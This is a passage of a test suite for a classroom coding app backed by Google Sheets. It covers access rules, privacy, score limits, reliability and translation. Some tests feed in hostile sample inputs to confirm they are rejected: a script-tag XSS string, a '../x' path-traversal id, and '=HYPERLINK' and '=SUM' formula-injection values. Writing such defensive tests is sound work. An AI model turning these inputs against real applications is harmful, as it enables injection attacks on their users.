  teacher('addStudents', cls.id, [`Ari M, ${ARI}`]);
  const ari = server.as(ARI);
  let ml5 = '';
  for (let i = 0; ; i++) { const part = ari('libraryPart', i); if (!part) break; ml5 += part; }
  const original = readFileSync(new URL('../vendor/ml5.min.js', import.meta.url), 'utf8');
  assert.equal(ml5, original.replace(/<\/script/gi, '<\\/script').replace(/<!--/g, '<\\!--'));
});

test('Apps Script gets no large inline JavaScript to rewrite', () => {
  // Apps Script rewrites inline scripts and broke the bundle that way, so real code ships as base64.
  for (const f of ['Index', 'Styles', 'P5', 'App']) {
    const html = readFileSync(new URL(`../dist/${f}.html`, import.meta.url), 'utf8');
    for (const [, attrs, body] of html.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/g)) {
      if (/text\/plain/.test(attrs)) {
        if (/base64/.test(attrs)) assert.match(body, /^[A-Za-z0-9+/=\s]*$/, `${f}: base64 block`);
        continue;
      }
      assert.ok(body.length < 4000, `${f}: inline script of ${body.length} characters`);
      assert.doesNotMatch(body, /`/, `${f}: template literal in an inline script`);
    }
  }
});

test('a batch follows the same access rules as single calls', () => {
  const { server, cls, ids } = setup();
  const r = server.raw(ARI, 'batch', [[['myWorks', []], ['classWork', [cls.id]], ['getWorkFull', [ids.bea]], ['batch', [[]]], ['session', []]]]);
  assert.equal(r.ok, true);
  const [mine, classWork, other, nested, session] = r.data;
  assert.equal(mine.ok, true);
  assert.equal(classWork.ok, false);
  assert.equal(other.ok, false);
  assert.equal(nested.ok, false);
  assert.equal(session.data.role, 'student');
  assert.equal(server.raw(ARI, 'batch', [Array.from({ length: 13 }, () => ['myWorks', []])]).ok, false);
  assert.equal(server.raw(STRANGER, 'batch', [[['myWorks', []]]]).data[0].ok, false);
  assert.ok(!JSON.stringify(r).includes('BEA'));
});

test('the teacher opens and closes the Music Maker for each class', () => {
  const { teacher, other, ari, zed, cls, clsB } = setup();
  const song = { name: 'theme', data: JSON.stringify({ tempo: 120, scale: 'bright', lead: 'C5 . E5', bass: '', drums: 'k . s' }) };
  assert.ok(ari('saveSong', song));
  teacher('setMusicOpen', cls.id, false);
  assert.throws(() => ari('saveSong', song), /closed the Music Maker/);
  assert.equal(ari('session').class.music_open, false);
  assert.ok(zed('saveSong', song), 'other classes keep their own setting');
  denied(() => ari('setMusicOpen', cls.id, true));
  denied(() => other('setMusicOpen', cls.id, true));
  teacher('setMusicOpen', cls.id, true);
  assert.ok(ari('saveSong', song));
  assert.equal(teacher('createClass', 'New').music_open ?? false, false, 'a new class starts closed');
  void clsB;
});

test('step progress is saved at the end of the row, so existing rows keep their columns', () => {
  const { server, ari, teacher, cls, ids } = setup();
  const before = server.sheets.get('Works').grid.map((r) => r.slice(0, 26));
  ari('saveWork', 't3', { code: 'let x = 1;', assets: {}, step_at: 3 });
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't3').step_at, 3);
  ari('saveWork', 't3', { code: 'let x = 2;', assets: {} });
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't3').step_at, 3, 'a save without a step keeps the old one');
  assert.equal(ari('saveWork', 't3', { code: 'x', assets: {}, step_at: 999 }).step_at, 40);
  const board = teacher('classBoard', cls.id).find((s) => s.id === ids[ARI]);
  assert.equal(board.works.find((w) => w.lesson_id === 't3').step_at, 40);
  // Rows saved before this field existed read back with their code intact and step 0.
  assert.deepEqual(server.sheets.get('Works').grid.slice(0, before.length).map((r) => r.slice(0, 26)), before);
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't1').step_at, 0);
  assert.equal(teacher('getWorkFull', ari('myWorks').find((w) => w.lesson_id === 't1').id).code, 'ARI SECRET CODE');
});

test('Trail Quest: time is earned by lessons, runs are held to what was possible, classes stay apart', () => {
  const { server, teacher, other, ari, bea, zed, cls, clsB, ids } = setup();
  // Closed until the teacher opens it, and only the class's teacher can.
  assert.equal(ari('worldState').mode, '');
  denied(() => ari('worldEnter'));
  denied(() => ari('setWorld', cls.id, { mode: 'free' }));
  denied(() => other('setWorld', cls.id, { mode: 'free' }));
  assert.deepEqual(teacher('setWorld', cls.id, { mode: 'earned', mins: 2 }), { world_mode: 'earned', world_mins: 2 });

  // Ari has only saved, not submitted, so no time yet. Bea submitted one lesson: 2 minutes.
  assert.equal(ari('worldState').seconds_left, 0);
  denied(() => ari('worldEnter'));
  assert.equal(bea('worldState').seconds_left, 120);
  assert.equal(bea('worldEnter').run_seconds, 120);
  denied(() => zed('worldEnter'), 'another class is still closed');

  // The browser can't claim more time or coins than the run allowed.
  const after = bea('worldRun', { seconds: 4, coins: 99999 });
  assert.equal(after.best, 40 + 4 * 20);
  assert.equal(after.floor, 1, 'no floor was claimed, so it counts as the first');
  assert.ok(after.seconds_left >= 115 && after.seconds_left <= 120);
  denied(() => bea('worldRun', { seconds: 1, coins: 5 }), 'a run can only be reported once');
  assert.equal(bea('worldState').runs, 1);

  // A run that is never reported still costs time, but never more than it was allowed.
  bea('worldEnter');
  const row = server.sheets.get('World').grid[1];
  const col = server.sheets.get('World').grid[0].indexOf('started_ms');
  row[col] = String(Date.now() - 3600000);
  assert.equal(bea('worldState').seconds_left, 0);
  denied(() => bea('worldEnter'));

  // Open to everyone: no time is charged, and the board shows only this class.
  teacher('setWorld', cls.id, { mode: 'free', mins: 2 });
  assert.equal(ari('worldEnter').run_seconds, 300);
  const board = ari('worldRun', { seconds: 2, coins: 10 }).board;
  assert.deepEqual(board.map((b) => b.display_name).sort(), ['Ari M', 'Bea T']);
  other('setWorld', clsB.id, { mode: 'free' });
  zed('worldEnter');
  assert.equal(zed('worldRun', { seconds: 1, coins: 1 }).board.length, 1);
  const text = JSON.stringify(ari('worldState'));
  assert.ok(!text.includes('@') && !text.includes('PRIVATE FEEDBACK'), 'no emails or grades');

  // Removing a student removes their Quest record.
  teacher('removeStudent', ids[BEA]);
  assert.equal(ari('worldState').board.length, 1);
});

test('Trail Quest ghosts: a best run can be raced by classmates, and only by them', () => {
  const { teacher, other, ari, bea, zed, cls, clsB } = setup();
  teacher('setWorld', cls.id, { mode: 'free' });
  other('setWorld', clsB.id, { mode: 'free' });
  const path = 'p' + '0a0b'.repeat(10);
  bea('worldEnter');
  // A run can't claim to be deeper than its time allowed, and a path may include trips down the stairs.
  const first = bea('worldRun', { seconds: 5, coins: 30, seed: 4242, path, floor: 50 });
  assert.equal(first.board[0].seed, 4242);
  assert.equal(first.floor, 2);
  assert.equal(first.board[0].floor, 2);
  bea('worldEnter');
  assert.equal(bea('worldRun', { seconds: 0, coins: 1, seed: 1, path: 'pzzzz0a0b', floor: 1 }).floor, 2, 'the deepest floor is kept');
  assert.ok(!JSON.stringify(first).includes(path), 'the board does not carry paths');
  const ghosts = ari('worldGhosts', 4242);
  assert.equal(ghosts.length, 1);
  assert.equal(ghosts[0].display_name, 'Bea T');
  assert.equal(ghosts[0].path, path);
  assert.deepEqual(ari('worldGhosts', 9999), []);
  assert.deepEqual(zed('worldGhosts', 4242), [], 'another class sees nothing');

  // A worse run keeps the old ghost. A better one replaces it. A path in the wrong form is left out.
  bea('worldEnter');
  bea('worldRun', { seconds: 5, coins: 10, seed: 7, path: 'p' + '1111'.repeat(3) });
  assert.equal(ari('worldGhosts', 4242).length, 1);
  bea('worldEnter');
  assert.equal(bea('worldRun', { seconds: 6, coins: 60, seed: 8, path: 'p<script>alert(1)</script>' }).best, 60);
  assert.equal(ari('worldGhosts', 8).length, 0);
  assert.equal(ari('worldGhosts', 4242)[0].best, 60, 'the score updates but the old ghost stays');
  bea('worldEnter');
  bea('worldRun', { seconds: 7, coins: 70, seed: 8, path: 'p' + 'zz00'.repeat(4) });
  assert.equal(ari('worldGhosts', 8).length, 1);
  assert.equal(ari('worldGhosts', 4242).length, 0);
});

test('lesson ratings: students rate their own lessons, and the teacher sees totals without names', () => {
  const { teacher, other, ari, bea, zed, cls, clsB, ids } = setup();
  denied(() => ari('rateLesson', 't1', { stars: 0 }));
  denied(() => ari('rateLesson', 't1', { stars: 9 }));
  denied(() => ari('rateLesson', 't9', { stars: 4 }), 'a lesson they never started');
  denied(() => ari('rateLesson', '../x', { stars: 4 }));
  denied(() => teacher('rateLesson', 't1', { stars: 4 }));
  ari('rateLesson', 't1', { stars: 2, confusing: ['where', 'errors', 'made-up'], step: 3, comment: 'I got lost on the sun step' });
  ari('rateLesson', 't1', { stars: 3, confusing: ['where', 'errors', 'made-up'], step: 3, comment: 'I got lost on the sun step' });
  bea('rateLesson', 't1', { stars: 5, confusing: ['nothing', 'code'], step: 2, comment: '' });

  denied(() => ari('lessonRatings', cls.id));
  denied(() => other('lessonRatings', cls.id));
  const [t1] = teacher('lessonRatings', cls.id);
  assert.equal(t1.count, 2, 'rating again replaces the first rating');
  assert.equal(t1.average, 4);
  assert.deepEqual(t1.stars, [0, 0, 1, 0, 1]);
  assert.deepEqual(t1.confusing, { where: 1, errors: 1, nothing: 1 }, 'only known reasons, and "nothing" stands alone');
  assert.deepEqual(t1.steps, { 3: 1 });
  assert.deepEqual(t1.comments, ['I got lost on the sun step']);
  const text = JSON.stringify(teacher('lessonRatings', cls.id));
  assert.ok(!text.includes(ids[ARI]) && !text.includes('Ari') && !text.includes('@'), 'no names, ids, or emails');
  assert.deepEqual(other('lessonRatings', clsB.id), []);
  teacher('removeStudent', ids[ARI]);
  assert.equal(teacher('lessonRatings', cls.id)[0].count, 1);
  void zed;
});

test('confusing flags and first tries: per student, added up for the teacher without names', () => {
  const { teacher, other, ari, bea, zed, cls, ids } = setup();
  denied(() => ari('flagStep', 't1', 'step:99x', 'unclear', ''));
  denied(() => ari('flagStep', 't1', 'step:2', 'made-up', ''));
  denied(() => teacher('flagStep', 't1', 'step:2', 'unclear', ''));
  ari('flagStep', 't1', 'step:2', 'unclear', 'where does the sun line go');
  ari('flagStep', 't1', 'step:2', 'broken', 'my code says error');
  bea('flagStep', 't1', 'step:2', 'unclear', '');
  bea('flagStep', 't1', 'quiz:1', 'hard', '');
  bea('flagStep', 't1', 'quiz:1', '', '');
  assert.deepEqual(ari('myFlags', 't1'), [{ target: 'step:2', reason: 'broken' }], 'flagging again replaces, and only your own show');

  // The first try on each check question is kept, whatever is sent later.
  ari('saveWork', 't1', { code: 'x', assets: {}, quiz_first: { 0: false, 1: true, junk: true } });
  ari('saveWork', 't1', { code: 'x', assets: {}, quiz_first: { 0: true, 2: true } });
  assert.deepEqual(ari('myWorks').find((w) => w.lesson_id === 't1').quiz_first, { 0: false, 1: true, 2: true });

  const t1 = teacher('lessonRatings', cls.id).find((l) => l.lesson_id === 't1');
  assert.equal(t1.started, 2);
  assert.equal(t1.finished, 1);
  assert.deepEqual(t1.flags, { 'step:2': { count: 2, reasons: { broken: 1, unclear: 1 }, notes: ['my code says error'] } });
  assert.deepEqual(t1.quiz['0'], { tries: 1, missed: 1 });
  denied(() => other('lessonRatings', cls.id));
  const text = JSON.stringify(teacher('lessonRatings', cls.id));
  assert.ok(!text.includes(ids[ARI]) && !text.includes('Ari') && !text.includes('@'));

  // Rating a lesson shows on the board only as a count, which earns XP.
  bea('rateLesson', 't1', { stars: 4, hardest: 'the sun', better: 'more pictures' });
  const board = ari('classBoard', cls.id);
  assert.equal(board.find((s) => s.id === ids[BEA]).rated, 1);
  assert.ok(!JSON.stringify(board).includes('more pictures'));
  assert.deepEqual(teacher('lessonRatings', cls.id).find((l) => l.lesson_id === 't1').better, ['more pictures']);
  void zed;
});

test('"I\'m stuck": one open request per student, seen and cleared only by their teacher', () => {
  const { teacher, other, ari, bea, zed, cls, clsB, ids } = setup();
  assert.deepEqual(ari('myHelp'), { open: false });
  ari('askHelp', 't1', 2, 'x'.repeat(300));
  ari('askHelp', 't1', 2, 'I cannot find line 6');
  bea('askHelp', 't3', 0, '');
  assert.deepEqual(ari('myHelp'), { open: true });
  denied(() => ari('helpRequests', cls.id));
  denied(() => other('helpRequests', cls.id));
  denied(() => other('markHelped', cls.id, ids[ARI]));
  const list = teacher('helpRequests', cls.id);
  assert.deepEqual(list.map((h) => [h.display_name, h.lesson_id, h.step, h.note]), [['Ari M', 't1', 2, 'I cannot find line 6'], ['Bea T', 't3', 0, '']]);
  assert.ok(!JSON.stringify(list).includes('@'), 'no emails');
  assert.deepEqual(other('helpRequests', clsB.id), []);

  teacher('markHelped', cls.id, ids[ARI]);
  assert.deepEqual(ari('myHelp'), { open: false });
  bea('cancelHelp');
  assert.deepEqual(teacher('helpRequests', cls.id), []);
  // Asking twice about the same step counts once; the report still knows the step needed help.
  assert.deepEqual(teacher('lessonRatings', cls.id).find((l) => l.lesson_id === 't1').help, { 2: 1 });
  assert.deepEqual(ari('myFlags', 't1'), [], 'a help request is not a "confusing" flag');
  void zed;
});

// Reliability: an error must never look like "no data", and a class must stay under Google's limits.
// See the reliability notes in CLAUDE.md.
function classOf(n = 3) {
  const server = createServer({ owner: OWNER, bound: false });
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'Period 1');
  const kids = Array.from({ length: n }, (_, i) => `kid${i}@school.test`);
  teacher('addStudents', cls.id, kids.map((k, i) => `Kid ${i}, ${k}`));
  return { server, teacher, cls, kids };
}

test('reliability: failing to open the Sheet says busy and never makes a new one', () => {
  const { server, teacher, cls, kids } = classOf();
  server.as(kids[0])('saveWork', 't1', { code: 'mine', assets: {} });
  const id = server.props.get('DATA_SHEET_ID');
  const books = server.books.size;
  server.fail.open = true;
  for (const [who, method, args] of [[OWNER, 'listClasses', []], [OWNER, 'session', []], [kids[0], 'session', []], [kids[0], 'myWorks', []], [kids[0], 'saveWork', ['t1', { code: 'x', assets: {} }]], [kids[1], 'classBoard', [cls.id]]]) {
    const r = server.raw(who, method, args);
    assert.equal(r.ok, false, method);
    assert.match(r.error, /^BUSY:/, method);
  }
  assert.equal(server.props.get('DATA_SHEET_ID'), id);
  assert.equal(server.books.size, books);
  assert.equal(server.createdCount(), 1);
  server.fail.open = false;
  assert.equal(teacher('listClasses').length, 1);
  assert.equal(teacher('listStudents', cls.id).length, 3);
  assert.equal(server.as(kids[0])('myWorks')[0].code, 'mine');
});

test('reliability: a deleted or unreachable Sheet is an error, not a fresh start', () => {
  const { server } = classOf();
  server.props.set('DATA_SHEET_ID', 'gone-000000000000000000000');
  assert.match(server.raw(OWNER, 'listClasses').error, /^BUSY:/);
  assert.equal(server.createdCount(), 1);
  assert.equal(server.props.get('DATA_SHEET_ID'), 'gone-000000000000000000000');
});

test('reliability: a bound script remembers its Sheet and keeps a history', () => {
  const server = createServer({ owner: OWNER });
  server.as(OWNER)('listClasses');
  assert.equal(server.createdCount(), 0);
  assert.equal(server.props.get('DATA_SHEET_ID'), 'fake-sheet-000000000000000');
  assert.equal(JSON.parse(server.props.get('DATA_SHEET_HISTORY')).length, 1);
});

test('reliability: a failed read never saves a blank over real work', () => {
  const { server, kids } = classOf();
  const kid = server.as(kids[0]);
  kid('saveWork', 't1', { code: 'real work', assets: {}, step_at: 4 });
  kid('updateProfile', { game_name: 'Sky Dash' });
  const before = JSON.stringify([...server.current().tabs].map(([n, t]) => [n, t.grid]));
  server.fail.reads = true;
  for (const [method, args] of [['saveWork', ['t1', { code: '', assets: {} }]], ['submitWork', ['t1', { code: '', assets: {} }]], ['updateProfile', [{ game_name: '' }]], ['rateLesson', ['t1', { stars: 1 }]], ['askHelp', ['t1', 0, '']]]) {
    assert.equal(server.raw(kids[0], method, args).ok, false, method);
  }
  server.fail.reads = false;
  assert.equal(JSON.stringify([...server.current().tabs].map(([n, t]) => [n, t.grid])), before);
  assert.equal(kid('myWorks')[0].code, 'real work');
});

test('reliability: a save that cannot get its turn says busy and changes nothing', () => {
  const { server, kids } = classOf();
  const kid = server.as(kids[0]);
  kid('saveWork', 't1', { code: 'first', assets: {} });
  server.fail.busyLock = true;
  assert.match(server.raw(kids[0], 'saveWork', ['t1', { code: 'second', assets: {} }]).error, /^BUSY:/);
  server.fail.busyLock = false;
  assert.equal(kid('myWorks')[0].code, 'first');
});

test('reliability: one student action reads a few rows, however many students there are', () => {
  const { server, teacher, cls, kids } = classOf(2);
  teacher('addStudents', cls.id, Array.from({ length: 300 }, (_, i) => `Filler ${i}, filler${i}@school.test`));
  for (let i = 0; i < 300; i += 7) for (const lesson of ['t1', 't2', 't3']) server.as(`filler${i}@school.test`)('saveWork', lesson, { code: 'x', assets: {} });
  const kid = server.as(kids[1]);
  kid('saveWork', 't1', { code: 'a', assets: {} });
  kid('saveWork', 't2', { code: 'a', assets: {} });
  for (const [method, args, most] of [['session', [], 100], ['saveWork', ['t2', { code: 'b', assets: {}, step_at: 2 }], 200], ['submitWork', ['t1', { code: 'b', assets: {} }], 200], ['myWorks', [], 200], ['myHelp', [], 100]]) {
    server.cellsRead();
    kid(method, ...args);
    const cells = server.cellsRead();
    assert.ok(cells < most, `${method} read ${cells} cells`);
  }
});

test('reliability: the class board is built once and shared, and changes still show', () => {
  const { server, cls, kids } = classOf();
  server.as(kids[0])('classBoard', cls.id);
  server.cellsRead();
  const board = server.as(kids[1])('classBoard', cls.id);
  assert.ok(server.cellsRead() < 60, 'the second student got the shared copy');
  assert.equal(board.length, 3);
  // A student who is not in the class still can't have it.
  const other = server.as(OWNER)('createClass', 'Period 2');
  assert.equal(server.raw(kids[0], 'classBoard', [other.id]).ok, false);
  // Changes that show on the board replace the shared copy at once.
  server.as(kids[0])('updateProfile', { game_name: 'Sky Dash' });
  assert.equal(server.as(kids[1])('classBoard', cls.id).find((s) => s.game_name === 'Sky Dash').display_name, 'Kid 0');
  server.as(kids[2])('saveWork', 't1', { code: 'x', assets: {}, checks_passed: 99999 });
  assert.equal(server.as(kids[1])('classBoard', cls.id).filter((s) => s.works.length).length, 1);
  // The board carries how many steps pass (it earns XP), held to a sane number.
  assert.equal(server.as(kids[1])('classBoard', cls.id).find((s) => s.works.length).works[0].checks_passed, 40);
  server.as(OWNER)('removeStudent', server.as(OWNER)('listStudents', cls.id)[0].id);
  assert.equal(server.as(kids[1])('classBoard', cls.id).length, 2);
});

test('reliability: the owner gets a daily backup and can make one', () => {
  const { server, teacher } = classOf();
  teacher('session');
  teacher('session');
  let info = teacher('dataInfo');
  assert.equal(info.backups.length, 1, 'one backup a day, not one a visit');
  assert.equal(info.students, 3);
  assert.equal(info.classes, 1);
  info = teacher('backupNow');
  assert.equal(info.backups.length, 2);
  const copy = server.books.get(info.backups[0].id);
  assert.equal(copy.getSheetByName('Students').getLastRow(), 4);
  // A backup that fails must never stop the teacher getting in.
  server.props.delete('LAST_BACKUP');
  server.current().copy = () => { throw new Error('Drive is full'); };
  assert.equal(teacher('session').role, 'teacher');
});

test('reliability: only the owner can see, move, or combine the data', () => {
  const { server, teacher, cls, kids } = classOf();
  server.current().getSheetByName('Teachers').appendRow(['co@school.test', 'Co Teacher', 'now']);
  const link = server.current().getUrl();
  for (const who of [kids[0], 'co@school.test', 'stranger@school.test']) {
    for (const [method, args] of [['dataInfo', []], ['backupNow', []], ['dataSwitch', [link]], ['dataCombine', [link, true]]]) {
      assert.equal(server.raw(who, method, args).ok, false, `${who} ${method}`);
    }
  }
  assert.equal(teacher('dataInfo').classes, 1);
  assert.equal(teacher('session').teacher.owner, true);
  assert.equal(server.as('co@school.test')('session').teacher.owner, false);
  assert.ok(cls.id);
});

test('reliability: switching checks the Sheet, and combining brings students back with the best of both', () => {
  const { server, teacher, cls, kids } = classOf();
  const old = server.current();
  const a = server.as(kids[0]);
  a('submitWork', 't1', { code: 'old t1 submitted', assets: {} });
  a('saveWork', 't2', { code: 'old t2', assets: {} });
  server.as(kids[1])('saveWork', 't1', { code: 'only in old', assets: {} });
  teacher('giveAward', teacher('listStudents', cls.id).find((s) => s.username === kids[0]).id, 'helper', 'well done');

  // Not Pixel Trail data: refused, and nothing changes.
  const junk = server.newBook('Budget');
  assert.match(server.raw(OWNER, 'dataSwitch', [junk.getUrl()]).error, /not Pixel Trail data/);
  assert.match(server.raw(OWNER, 'dataSwitch', ['hello']).error, /Paste the link/);
  assert.equal(server.current(), old);

  // The incident: the app ends up on an empty Sheet, and one student carries on there.
  const fresh = server.newBook('Pixel Trail Data');
  server.props.set('DATA_SHEET_ID', fresh.getId());
  server.clearCache();
  const again = teacher('createClass', 'Period 1');
  teacher('addStudents', again.id, [`Kid 0, ${kids[0]}`]);
  a('saveWork', 't1', { code: 'new t1 in progress', assets: {} });
  a('saveWork', 't3', { code: 'new t3', assets: {} });
  assert.equal(teacher('listStudents', again.id).length, 1);

  const plan = teacher('dataCombine', old.getUrl(), false);
  assert.deepEqual([plan.preview, plan.classes, plan.students, plan.same_students, plan.lessons, plan.better_lessons], [true, 0, 2, 1, 2, 1]);
  assert.equal(teacher('listStudents', again.id).length, 1, 'a preview changes nothing');
  const backups = teacher('dataInfo').backups.length;
  teacher('dataCombine', old.getUrl(), true);
  assert.equal(teacher('dataInfo').backups.length, backups + 1, 'backed up first');

  assert.equal(teacher('listClasses').length, 1, 'the class made again by hand is the same class');
  assert.equal(teacher('listStudents', again.id).length, 3);
  const mine = Object.fromEntries(a('myWorks').map((w) => [w.lesson_id, w]));
  assert.equal(mine.t1.code, 'old t1 submitted');
  assert.equal(mine.t1.status, 'submitted');
  assert.equal(mine.t2.code, 'old t2');
  assert.equal(mine.t3.code, 'new t3');
  assert.equal(server.as(kids[1])('myWorks')[0].code, 'only in old');
  assert.equal(teacher('classBoard', again.id).find((s) => s.display_name === 'Kid 0').awards.length, 1);

  // Twice changes nothing.
  const grid = JSON.stringify([...server.current().tabs].map(([n, t]) => [n, t.grid]));
  const second = teacher('dataCombine', old.getUrl(), true);
  assert.deepEqual([second.classes, second.students, second.lessons, second.better_lessons], [0, 0, 0, 0]);
  assert.equal(JSON.stringify([...server.current().tabs].map(([n, t]) => [n, t.grid])), grid);
  // And the old Sheet was only read.
  assert.equal(old.getSheetByName('Students').getLastRow(), 4);

  // Switching back to the old Sheet works, and is remembered in the history.
  assert.equal(teacher('dataSwitch', old.getUrl()).id, old.getId());
  assert.equal(server.current(), old);
  assert.ok(teacher('dataInfo').history.length >= 2);
});

test('translate: each sentence is translated once and then shared', () => {
  const { server, kids } = classOf();
  const a = server.as(kids[0]);
  const texts = ['Draw a circle.', 'Change <span id="m0" class="notranslate" translate="no">fill(255)</span> to red.'];
  assert.deepEqual(a('translate', 'pt-BR', texts), texts.map((t) => `[pt] ${t}`));
  assert.equal(server.translated.length, 2);
  // A classmate, and a new day with an empty cache, cost the translator nothing.
  assert.deepEqual(server.as(kids[1])('translate', 'pt-BR', [texts[1], 'Draw a circle.']), [`[pt] ${texts[1]}`, '[pt] Draw a circle.']);
  server.clearCache();
  assert.equal(server.as(OWNER)('translate', 'pt-BR', ['Draw a circle.'])[0], '[pt] Draw a circle.');
  assert.equal(server.translated.length, 2);
  assert.equal(server.sheets.get('Translations').getLastRow(), 3);
});

test('translate: limits, unknown languages, and a translator that is out of quota', () => {
  const { server, kids } = classOf();
  const a = server.as(kids[0]);
  assert.equal(server.raw(kids[0], 'translate', ['xx', ['hi']]).ok, false);
  assert.equal(server.raw(kids[0], 'translate', ['pt-BR', Array(41).fill('hi')]).ok, false);
  assert.equal(server.raw('stranger@school.test', 'translate', ['pt-BR', ['hi']]).ok, false);
  assert.deepEqual(a('translate', 'pt-BR', ['x'.repeat(1501), '=SUM(A1)']), [null, '[pt] =SUM(A1)']);
  server.fail.translate = true;
  assert.deepEqual(a('translate', 'pt-BR', ['New words here']), [null]);
  server.fail.translate = false;
  // Saving a translation must wait its turn like any write, but a busy lock doesn't lose the answer.
  server.fail.busyLock = true;
  assert.deepEqual(a('translate', 'pt-BR', ['Busy words']), ['[pt] Busy words']);
  server.fail.busyLock = false;
});

test('problem reports: anyone signed in can send one, and the right teacher sees it', () => {
  const { server, teacher, kids } = classOf();
  server.current().getSheetByName('Teachers').appendRow(['co@school.test', 'Co Teacher', 'now']);
  const co = server.as('co@school.test');
  const a = server.as(kids[0]);
  assert.equal(server.raw(kids[0], 'reportBug', ['   ', {}]).ok, false);
  assert.equal(server.raw('stranger@school.test', 'reportBug', ['hi', {}]).ok, false);
  a('reportBug', '=HYPERLINK("x") the Run button did nothing', { page: '/lesson/t3', lesson: 't3', step: '2', errors: ['boom'], secret: 'dropped', browser: 'x'.repeat(999) });
  co('reportBug', 'gradebook is blank', { page: '/class/abc' });
  const seen = teacher('bugReports');
  assert.equal(seen.length, 2);
  const kid = seen.find((b) => b.role === 'student');
  assert.equal(kid.note, '=HYPERLINK("x") the Run button did nothing');
  assert.equal(kid.class_name, 'Period 1');
  assert.deepEqual(kid.details.errors, ['boom']);
  assert.equal(kid.details.secret, undefined);
  assert.equal(kid.details.browser.length, 200);
  // Another teacher sees their own report, not this class's. Students can't read reports at all.
  assert.deepEqual(co('bugReports').map((b) => b.note), ['gradebook is blank']);
  assert.equal(server.raw(kids[1], 'bugReports', []).ok, false);
  assert.equal(server.raw('co@school.test', 'closeBug', [kid.id]).ok, false);
  assert.equal(teacher('closeBug', kid.id).length, 1);
  // A student can't flood the list.
  for (let i = 0; i < 4; i++) a('reportBug', `again ${i}`, {});
  assert.match(server.raw(kids[0], 'reportBug', ['one more', {}]).error, /few reports today/);
});

test('student view: a teacher can be a pretend student that no class ever sees', () => {
  const { server, teacher, cls, kids } = classOf();
  const s = teacher('previewStart');
  assert.equal(s.role, 'student');
  assert.equal(s.preview, true);
  assert.equal(s.class.world_mode, 'free');
  assert.equal(teacher('previewStart').student.id, s.student.id, 'the same pretend student each time');
  // They can do what a student does...
  teacher('asStudent', 'saveWork', ['t1', { code: 'teacher trying it', assets: {} }]);
  teacher('asStudent', 'updateProfile', [{ avatar: { hat: 'crown' } }]);
  assert.equal(teacher('asStudent', 'myWorks', [])[0].code, 'teacher trying it');
  assert.equal(teacher('asStudent', 'classBoard', [s.student.class_id]).length, 1);
  // ...and nothing a student can't.
  for (const [m, a] of [['listClasses', []], ['dataInfo', []], ['batch', [[['myWorks', []]]]], ['asStudent', ['myWorks', []]], ['classBoard', [cls.id]]]) {
    assert.equal(server.raw(OWNER, 'asStudent', [m, a]).ok, false, m);
  }
  // Students can't use it, and it never shows in the teacher's classes, rosters, or boards.
  assert.equal(server.raw(kids[0], 'previewStart', []).ok, false);
  assert.equal(server.raw(kids[0], 'asStudent', ['myWorks', []]).ok, false);
  assert.deepEqual(teacher('listClasses').map((c) => c.name), ['Period 1']);
  assert.equal(teacher('listStudents', cls.id).length, 3);
  assert.equal(teacher('classBoard', cls.id).length, 3);
  assert.equal(teacher('classWork', cls.id).length, 0);
  assert.equal(server.raw(kids[0], 'classBoard', [s.student.class_id]).ok, false);
  assert.equal(server.raw(OWNER, 'getClass', [s.student.class_id]).ok, false);
  // Its sign-in name is not an email address, so no Google account can ever be it.
  assert.doesNotMatch(s.student.username, /^[^:]+@/);
  // Starting over clears its work.
  assert.equal(teacher('previewReset').student.id, s.student.id);
  assert.equal(teacher('asStudent', 'myWorks', []).length, 0);
});

test('Classroom assignments: descriptions, the topic, and bringing old ones up to date', () => {
  const data = { courses: [{ id: 'c1', name: 'CS 7' }], rosters: { c1: [{ userId: 'g1', profile: { emailAddress: 'ava@school.test', name: { givenName: 'Ava', familyName: 'Lee' } } }] }, topicsAllowed: true };
  const server = createServer({ owner: OWNER, classroom: data });
  const t = server.as(OWNER);
  t('listClasses');
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const [r] = t('importCourses', ['c1']);
  const long = `Pixel Trail · Base Camp · Lesson 1 of 15\n\nHello, Canvas\nDraw   a scene.\r\n\n\n\nStandards\n• 6-8.CT.d.6: Use an iterative approach <b>bold</b>\n${'x'.repeat(9000)}`;
  const first = t('createAssignments', r.class_id, [{ key: 'L1', ids: ['t1'], title: 'Hello, Canvas', points: 100, description: long }], {});
  assert.equal(first.created, 1);
  assert.equal(first.topic, true);
  const work = data.created[0];
  // Line breaks survive, so the description reads as written. Markup and runs of blank lines don't.
  assert.ok(work.description.startsWith('Pixel Trail · Base Camp · Lesson 1 of 15\n\nHello, Canvas\nDraw a scene.\n\nStandards\n• 6-8.CT.d.6: Use an iterative approach bbold/b'));
  assert.equal(work.description.length, 8000);
  assert.ok(!/[<>\r]/.test(work.description));
  // One "Pixel Trail" topic per course, made once and reused.
  assert.equal(work.topicId, 'topic-1');
  t('createAssignments', r.class_id, [{ key: 'L2', ids: ['t3'], title: 'It Moves!', points: 100, description: 'Second.' }], {});
  assert.equal(data.created[1].topicId, 'topic-1');
  assert.deepEqual(data.topics.c1.map((x) => x.name), ['Pixel Trail']);

  // Updating: owner only, only assignments this app made, and only the description changes.
  const fresh = [{ key: 'L1', ids: ['t1'], description: 'New words\nabout the trail.' }, { key: 'L9', ids: ['c1'], description: 'Never made.' }, { key: 'L2', ids: ['t3'], description: '   ' }];
  for (const who of ['ava@school.test', OTHER]) assert.equal(server.raw(who, 'updateAssignments', [r.class_id, fresh]).ok, false, who);
  assert.equal(server.raw(OWNER, 'updateAssignments', [r.class_id, [{ key: 'bad', ids: ['t1'], description: 'x' }]]).ok, false);
  const before = { ...data.created[0] };
  const up = t('updateAssignments', r.class_id, fresh);
  assert.equal(up.updated, 1);
  assert.equal(up.skipped.length, 1, 'one was never made in Classroom');
  assert.equal(up.failed.length, 1, 'an empty description is not written over a real one');
  assert.equal(data.created[0].description, 'New words\nabout the trail.');
  assert.equal(data.created[1].description, 'Second.');
  for (const f of ['title', 'maxPoints', 'state', 'topicId', 'id']) assert.equal(data.created[0][f], before[f], `${f} was not touched`);
  // If Classroom refuses one, the rest still go through and the refusal is reported.
  data.created[1].courseId = 'somewhere-else';
  const partly = t('updateAssignments', r.class_id, [{ key: 'L2', ids: ['t3'], description: 'x' }, { key: 'L1', ids: ['t1'], description: 'Again.' }]);
  assert.equal(partly.updated, 1);
  assert.match(partly.failed[0], /It Moves!/);
